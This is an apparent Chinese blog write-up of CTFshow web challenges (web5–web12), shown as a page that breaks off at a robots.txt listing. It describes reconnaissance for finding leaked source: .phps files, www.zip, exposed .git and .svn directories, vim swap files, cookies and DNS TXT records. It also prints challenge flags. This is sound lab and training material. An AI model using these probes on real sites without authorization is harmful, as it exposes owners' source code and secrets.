<!DOCTYPE html><html lang="zh-CN" data-default-color-scheme="auto"><head><meta charset="UTF-8"><link rel="apple-touch-icon" sizes="76x76" href="/img/avatar/avatar.jpg"><link rel="icon" href="/img/avatar/avatar.jpg"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5,shrink-to-fit=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta name="theme-color" content="#00000080"><meta name="author" content="4rozeN"><meta name="keywords" content="blog, programming, CTF, Vue, backend, Git, Uni-app"><meta name="description" content="CTFSHOW_web_WP   信息搜集 web1-4 太简单，直接写 web5 没见过的。  web5	(源码泄露 phps) ​	源代码无 flag、请求头无提示、dirsearch 扫不到东西。根据题目描述，是 phps 源码泄露  phps 文件就是 php 的源代码文件，通常用于提供给用户（访问者）查看 php 代码，因为用户无法直接通过 Web 浏览器看到 php 文件的内容，所"><meta property="og:type" content="article"><meta property="og:title" content="CTFSHOW-WEB-WP（未完结）"><meta property="og:url" content="https://4rozen.github.io/archives/WP/55980.html"><meta property="og:site_name" content="4rozeN&#39;s blog"><meta property="og:description" content="CTFSHOW_web_WP   信息搜集 web1-4 太简单，直接写 web5 没见过的。  web5	(源码泄露 phps) ​	源代码无 flag、请求头无提示、dirsearch 扫不到东西。根据题目描述，是 phps 源码泄露  phps 文件就是 php 的源代码文件，通常用于提供给用户（访问者）查看 php 代码，因为用户无法直接通过 Web 浏览器看到 php 文件的内容，所"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222246505.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222148448.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222148838.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222148563.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222148071.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222148574.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222148620.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222148617.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222148839.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222149998.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222149754.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222149940.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222149223.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222149883.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222149636.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222149571.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222149946.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222149706.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222149753.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222150439.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222150144.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222150034.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222150827.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222150216.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222150329.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222150322.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222150942.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222151177.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222151141.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222151595.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222151659.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222151036.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222152239.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222152597.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222152402.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222152203.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222152557.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222152082.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222153507.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222153626.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222153300.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222153015.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222153039.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222153204.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222154917.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211231640235.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211231642062.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211232142068.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211282153474.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202212261709382.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202212261712838.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202212271208895.png"><meta property="og:image" content="https://img-blog.csdnimg.cn/e9b3aa95caa149f380620e0734cc35f3.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202212281848776.png"><meta property="og:image" content="https://img-blog.csdnimg.cn/5e03201e39384b89a978267a2eac0b92.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202212281851904.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202212282006143.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202212310622324.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222154031.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222154055.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222154944.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222154666.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222155947.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222155859.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222155943.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222155896.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222155177.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301171354545.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301171406920.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301171423933.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301171425742.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301071251204.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301071255533.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301171447787.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301171452978.jpg"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301171451197.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301071521179.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301071529081.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301071547168.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301071558831.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301071559235.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301131601208.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301131604868.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301131605366.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301152044709.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301152100380.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301152202516.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301152202484.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301152204504.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301161242930.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301161252969.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301161310807.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301161320842.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301161329191.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301161340954.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301161345721.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301161432941.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301161515341.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301161554271.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301161556311.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301161621596.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301171529126.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301171538546.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222156070.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222156323.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222156174.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222156407.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222156781.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222156528.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222156757.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222156877.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211251922522.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211252118445.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211252119437.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211252123050.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211252122568.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211252140645.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211252312601.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211252324510.png"><meta property="og:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211252325394.png"><meta property="article:published_time" content="2023-03-25T15:50:13.000Z"><meta property="article:modified_time" content="2024-10-26T19:43:29.293Z"><meta property="article:author" content="4rozeN"><meta property="article:tag" content="CTF-WP"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222246505.png"><meta name="google-site-verification" content="ggjgSh07y0_dbMruvoZhis-cgZn-t6ujdG7N1z7ZA88"><meta name="msvalidate.01" content="F0E34077A7291AC38724F6A3804B1B29"><meta name="referrer" content="no-referrer"><script src="https://kit.fontawesome.com/d51e98a2a3.js" crossorigin="anonymous"></script><title>CTFSHOW-WEB-WP（未完结） - 4rozeN&#39;s blog</title><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/katex@0.13.0/dist/katex.min.css"><link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css"><link rel="stylesheet" href="https://at.alicdn.com/t/font_1736178_kmeydafke9r.css"><link rel="stylesheet" href="/css/main.css"><link id="highlight-css" rel="stylesheet" href="/css/highlight.css"><link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css"><link rel="stylesheet" href="/css/overrideHighlight.css"><link rel="stylesheet" href="/css/codeFloding.css"><link rel="stylesheet" href="/css/figure.css"><link rel="stylesheet" href="/css/sign.css"><link rel="stylesheet" href="/css/blockquote.css"><link rel="stylesheet" href="/css/backgroundize.css"><link rel="stylesheet" href="/css/scrollAnimation.css"><script id="fluid-configs">var Fluid=window.Fluid||{};Fluid.ctx=Object.assign({},Fluid.ctx);var CONFIG={hostname:"4rozen.github.io",root:"/",version:"1.9.8",typing:{enable:!0,typeSpeed:70,cursorChar:"|",loop:!1,scope:[]},anchorjs:{enable:!0,element:"h1,h2,h3,h4,h5,h6",placement:"right",visible:"hover",icon:"❡"},progressbar:{enable:!0,height_px:3,color:"#29d",options:{showSpinner:!0,trickleSpeed:100}},code_language:{enable:!0,default:"TEXT"},copy_btn:!0,image_caption:{enable:!0},image_zoom:{enable:!0,img_url_replace:["",""]},toc:{enable:!0,placement:"right",headingSelector:"h1,h2,h3,h4,h5,h6",collapseDepth:1},lazyload:{enable:!0,loading_img:"/img/loading/loading.gif",onlypost:!1,offset_factor:2},web_analytics:{enable:!1,follow_dnt:!0,baidu:null,google:null,tencent:{sid:null,cid:null},leancloud:{app_id:null,app_key:null,server_url:null,path:"window.location.pathname",ignore_local:!1},umami:{src:null,website_id:null,domains:null,start_time:"2024-01-01T00:00:00.000Z",token:null,api_server:null},gtag:null,woyaola:null,cnzz:null},search_path:"/local-search.xml",include_content_in_search:!0};if(CONFIG.web_analytics.follow_dnt){var dntVal=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack;Fluid.ctx.dnt=dntVal&&(dntVal.startsWith("1")||dntVal.startsWith("yes")||dntVal.startsWith("on"))}</script><script src="/js/utils.js"></script><script src="/js/color-schema.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-shiki-plugin@latest/lib/codeblock.css"><style>:root{--hl-color:#abb2bf;--hl-bg:#282c34;--hltools-bg:#21252b;--hltools-color:#bbbbbc;--hlnumber-bg:#282c34;--hlnumber-color:#495162;--hlscrollbar-bg:#373c47;--hlexpand-bg:linear-gradient(180deg,rgba(40,44,52,0.1),rgba(40,44,52,0.9))}</style><style>.code-expand-btn:not(.expand-done)~* div.codeblock,.code-expand-btn:not(.expand-done)~div.codeblock{overflow:hidden;height:360px}</style><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="4rozeN's blog" type="application/atom+xml">
</head><body><div id="web_bg"></div><header><div class="header-inner" style="height:70vh"><nav id="navbar" class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"><div class="container"><a class="navbar-brand" href="/"><strong>4rozeN&#39;s Blog</strong> </a><button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><div class="animated-icon"><span></span><span></span><span></span></div></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav ml-auto text-center"><li class="nav-item"><a class="nav-link" href="/" target="_self"><i class="iconfont icon-home-fill"></i> <span>首页</span></a></li><li class="nav-item"><a class="nav-link" href="/archives/" target="_self"><i class="iconfont icon-archive-fill"></i> <span>归档</span></a></li><li class="nav-item"><a class="nav-link" href="/categories/" target="_self"><i class="iconfont icon-category-fill"></i> <span>分类</span></a></li><li class="nav-item"><a class="nav-link" href="/tags/" target="_self"><i class="iconfont icon-tags-fill"></i> <span>标签</span></a></li><li class="nav-item"><a class="nav-link" href="/about/" target="_self"><i class="iconfont icon-user-fill"></i> <span>关于</span></a></li><li class="nav-item" id="search-btn"><a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search"><i class="iconfont icon-search"></i></a></li><li class="nav-item" id="color-toggle-btn"><a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle"><i class="iconfont icon-dark" id="color-toggle-icon"></i></a></li></ul></div></div></nav><div id="banner" class="banner" parallax="true" style="background:url(/img/bg/eva.webp) no-repeat center center;background-size:cover"><div class="full-bg-img"><div class="mask flex-center" style="background-color:rgba(0,0,0,.3)"><div class="banner-text text-center fade-in-up"><div class="h2"><span id="subtitle" data-typed-text="CTFSHOW-WEB-WP（未完结）"></span></div><div class="mt-3"><span class="post-meta mr-2"><i class="iconfont icon-author" aria-hidden="true"></i> 4rozeN </span><span class="post-meta"><i class="iconfont icon-date-fill" aria-hidden="true"></i> <time datetime="2023-03-25 23:50" pubdate>2023年3月25日 晚上</time></span></div><div class="mt-1"><span class="post-meta mr-2"><i class="iconfont icon-chart"></i>29k 字 </span><span class="post-meta mr-2"><i class="iconfont icon-clock-fill"></i>243 分钟</span></div></div></div></div></div></div></header><main><div class="container-fluid nopadding-x"><div class="row nomargin-x"><div class="side-col d-none d-lg-block col-lg-2"></div><div class="col-lg-8 nopadding-x-md"><div class="container nopadding-x-md" id="board-ctn"><div id="board"><article class="post-content mx-auto"><h1 id="seo-header">CTFSHOW-WEB-WP（未完结）</h1><p id="updated-time" class="note note-info">本文最后更新于：2024年10月27日 凌晨</p><div class="markdown-body"><link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><h1 id="ctfshow_web_wp"><a class="markdownIt-Anchor" href="#ctfshow_web_wp"></a> CTFSHOW_web_WP</h1><meta name="description" content="记录CTFSHOW的会员WEB题目的题解：从信息泄露到sql注入（未写完）"><h2 id="信息搜集"><a class="markdownIt-Anchor" href="#信息搜集"></a> 信息搜集</h2><p>web1-4 太简单，直接写 web5 没见过的。</p><h3 id="web5源码泄露phps"><a class="markdownIt-Anchor" href="#web5源码泄露phps"></a> web5	(源码泄露 phps)</h3><p>​	源代码无 flag、请求头无提示、dirsearch 扫不到东西。根据题目描述，是 phps 源码泄露</p><blockquote><p>phps 文件就是 php 的源代码文件，通常用于提供给用户（访问者）查看 php 代码，因为用户无法直接通过 Web 浏览器看到 php 文件的内容，所以需要用 phps 文件代替。其实，只要不用 php 等已经在服务器中注册过的 MIME 类型为文件即可，但为了国际通用，所以才用了 phps 文件类型。</p></blockquote><p>可以进行试探，index.phps、flag.phps 等，这里是 index.phps</p><p>得到 flag：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{31c809a5-db0b-4b7e-8473-2d44bda8a644}</span></span></code></pre></div></div></figure><h3 id="web6扫目录"><a class="markdownIt-Anchor" href="#web6扫目录"></a> web6	(扫目录)</h3><p>题目描述：解压源码到当前目录，测试正常，收工</p><p>源代码无、请求头无，dirsearch 扫出：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">www.zip</span></span></code></pre></div></div></figure><p>得到 flag 所在文件</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#dcdcaa">//flag</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">in</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">fl000g.txt</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"web6:where is flag?"</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><p>得到 flag：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{be330719-e0fb-4559-84ec-64896ce3a888}</span></span></code></pre></div></div></figure><h3 id="web7扫目录"><a class="markdownIt-Anchor" href="#web7扫目录"></a> web7	(扫目录)</h3><p>题目提示：版本控制很重要，但不要部署到生产环境更重要。</p><p>dirsearch 扫出结果：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">http:</span><span style="color:#6a9955">//bba765d2-7f01-436e-b6e0-223644bd4ca1.challenge.ctf.show/.git/</span></span></code></pre></div></div></figure><p>得到 flag：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{95be9143-b5fd-4d89-8418-5de3a2fe5f18}</span></span></code></pre></div></div></figure><h3 id="web8扫目录"><a class="markdownIt-Anchor" href="#web8扫目录"></a> web8	(扫目录)</h3><p>题目描述：版本控制很重要，但不要部署到生产环境更重要。</p><p>dirsearch 扫出：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">http:</span><span style="color:#6a9955">//07abf623-ca12-4a99-bdb6-6cee55b38c36.challenge.ctf.show/.svn/</span></span></code></pre></div></div></figure><p>得到 flag：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{7fadf802-c6ff-440d-aec1-2600d69b66ce}</span></span></code></pre></div></div></figure><h3 id="web9vim文件泄露"><a class="markdownIt-Anchor" href="#web9vim文件泄露"></a> web9	(vim 文件泄露)</h3><p>题目描述：发现网页有个错别字？赶紧在生产环境 vim 改下，不好，死机了。</p><p>猜测是 vim 文件泄露。</p><blockquote><p>当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当 vim 异常退出时，缓存会一直留在服务器上，引起网站源码泄露。</p><p>使用 vim 时会创建临时缓存文件，关闭 vim 时缓存文件则会被删除，当 vim 异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。</p><p>以 index.php 为例：</p><p>第一次产生的交换文件名为 <strong><code>.index.php.swp</code></strong></p><p>再次意外退出后，将会产生名为 **<code>.index.php.swo</code>** 的交换文件</p><p>第三次产生的交换文件则为 <strong><code>.index.php.swn</code></strong></p></blockquote><p>因为没有提示是编辑什么文件的时候发生的死机，这里只能试试：index.php 或者 flag.php 等</p><p>这题是 index.php.swp。</p><p>拿到之后可以用 vim 恢复文件（这题不用），命令为</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">vim</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">-r</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">index.php.swp</span></span></code></pre></div></div></figure><p>得到 flag：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{f50708e9-d7e4-4317-8784-eb468f5a3ae4}</span></span></code></pre></div></div></figure><h3 id="web10cookie信息泄露"><a class="markdownIt-Anchor" href="#web10cookie信息泄露"></a> web10	(cookie 信息泄露)</h3><p>题目描述：cookie 只是一块饼干，不能存放任何隐私数据</p><p>根据描述查看 cookie：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow%7Bc1d80b6b-3436-4c94-b2a4-432674fd6e32%7D</span></span>
<span class="line"><span style="color:#dcdcaa">进行url解码：</span></span>
<span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{c1d80b6b-3436-4c94-b2a4-432674fd6e32}</span></span></code></pre></div></div></figure><h3 id="web11域名解析记录"><a class="markdownIt-Anchor" href="#web11域名解析记录"></a> web11	(域名解析记录)</h3><p>题目描述：</p><blockquote><p>域名其实也可以隐藏信息，<a target="_blank" rel="noopener" href="http://xn--flag-f96g315g.ctfshow.com">比如 flag.ctfshow.com</a> 就隐藏了一条信息</p><p>由于动态更新，txt 记录会变 最终 flag：flag {just_seesee}</p></blockquote><p><a target="_blank" rel="noopener" href="http://xn--flag-uw4gv5xvzs2s5ad1p2y1d.ctfshow.com">题目网址就是 flag.ctfshow.com</a></p><p>要通过 dns 检查查询 flag 的 TXT 记录，一般指为某个主机名或域名设置的说明。</p><p>查找 flag.ctfshow.com 域名下的 txt 记录</p><p>域名解析查询：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">http:</span><span style="color:#6a9955">//dbcha.com/</span></span></code></pre></div></div></figure><p>flag：</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">flag{just_seesee}</span></span></code></pre></div></div></figure><h3 id="web12公开信息收集"><a class="markdownIt-Anchor" href="#web12公开信息收集"></a> web12	(公开信息收集)</h3><p>题目描述：有时候网站上的公开信息，就是管理员常用密码。</p><p>常规查看 robots.txt：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">http:</span><span style="color:#6a9955">//90dc1924-e96d-4609-ab5b-f8a228b88c07.challenge.ctf.show/robots.txt</span></span></code></pre></div></div></figure><p>得到：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">User-agent: *</span></span>
